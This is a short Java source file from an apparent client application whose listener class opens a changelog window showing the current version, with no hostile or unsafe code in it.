package su.jrat.client.listeners;

import su.jrat.client.Constants;
import su.jrat.client.ui.frames.FrameChangelog;
import su.jrat.common.Version;

public class ChangelogListener extends Performable {

	@Override
	public void perform() {
		FrameChangelog frame = new FrameChangelog(Constants.CHANGELOG_URL, Version.getVersion());
		frame.setVisible(true);
	}

}
